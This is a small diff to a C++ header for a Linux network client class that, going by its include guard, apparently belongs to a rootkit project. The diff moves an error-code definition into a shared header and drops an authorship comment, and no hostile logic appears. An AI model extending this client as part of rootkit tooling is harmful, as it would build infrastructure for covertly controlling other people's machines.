@@ -1,7 +1,3 @@
-//
-// Created by idan on 1/20/24.
-//
-
 #ifndef ROOTKIT_LINUX_CLIENT_H
 #define ROOTKIT_LINUX_CLIENT_H
 
@@ -10,11 +6,12 @@
 #include "../../basic/network/basic_client.h"
 #include "../../basic/network/tcp_port.h"
 
+#include "../error_codes.h"
+
 class linux_client : public basic_client {
     TCP_PORT server_port;
     std::string server_addr;
 
-#define SOCKET_ERROR (-1)
     int my_sd = SOCKET_ERROR;
 
 public:
